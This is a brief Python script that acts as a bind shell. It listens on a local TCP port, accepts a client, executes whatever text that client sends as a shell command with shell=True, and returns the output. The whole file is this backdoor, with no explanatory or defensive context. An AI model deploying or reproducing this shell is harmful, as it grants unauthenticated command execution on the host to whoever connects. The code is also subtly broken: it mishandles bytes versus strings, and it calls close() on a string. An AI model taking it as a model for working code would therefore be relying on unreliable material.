import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(('127.0.0.1', 8080)) #binds to the ip and port

s.listen(5) #listens for 5 connections
client, addr = s.accept() #accepts a connection
cmdlet = client.recv(2048)#receives the cmdlet
while cmdlet!= 'exit':
    print(cmdlet)
    cmdlet = str(cmdlet)

    results = subprocess.check_output(cmdlet, shell=True)#executes the cmdlet
    print(results)#returns the results
    client.send(results)#sends the results to the client
    cmdlet = client.recv(2048).decode()#receives the results from the client
cmdlet.close()
s.close()


